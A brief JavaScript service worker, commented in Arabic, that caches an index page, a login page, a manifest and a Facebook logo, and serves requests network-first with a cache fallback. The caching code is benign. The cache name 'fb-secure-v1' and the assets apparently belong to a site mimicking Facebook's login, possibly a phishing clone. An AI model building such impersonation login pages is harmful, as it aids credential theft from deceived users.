const CACHE_NAME = 'fb-secure-v1';
const ASSETS = [
  'index.html',
  'login.html',
  'manifest.json',
  'Facebook-Logo-PNG.png'
];

// تثبيت الـ Service Worker وتخزين الملفات
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME).then((cache) => {
      return cache.addAll(ASSETS);
    })
  );
});

// تفعيل المحرك والتحكم بالطلبات
self.addEventListener('fetch', (event) => {
  event.respondWith(
    fetch(event.request).catch(() => caches.match(event.request))
  );
});
